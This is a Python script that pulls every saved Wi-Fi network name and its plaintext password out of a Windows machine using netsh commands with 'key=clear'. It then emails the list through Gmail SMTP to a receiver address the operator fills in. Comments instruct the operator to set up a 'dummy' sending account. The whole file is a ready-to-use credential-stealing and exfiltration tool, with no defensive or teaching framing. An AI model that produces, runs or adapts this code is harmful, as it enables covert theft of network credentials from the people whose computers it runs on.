# Imports
import subprocess
import re
import smtplib
from email.message import EmailMessage

# Get Wifi Passwords
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()

        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode("utf8")
            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            
            wifi_list.append(wifi_profile)

# Email MSG
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Pass: {item['password']}\n"

# Email Obj.
email = EmailMessage()
email["from"] = "name" # Change to your name (f.e. "sane")
email["to"] = "email_of_receiver" # Change to the email that receives it (f.e. "sane@gmail.com")
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create SMTP Server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.login("email_name", "email_password") # Change to email and password of dummy (f.e. "sane" , "password")
    smtp.send_message(email)

'''If the used Dummy Email is a gmail account, remember to allow insecure Apps. Also for the dummy email_name,
only put the beginning of the email and remove the @gmail.com (f.e. email: "sane@gmail.com" but you only put
"sane")'''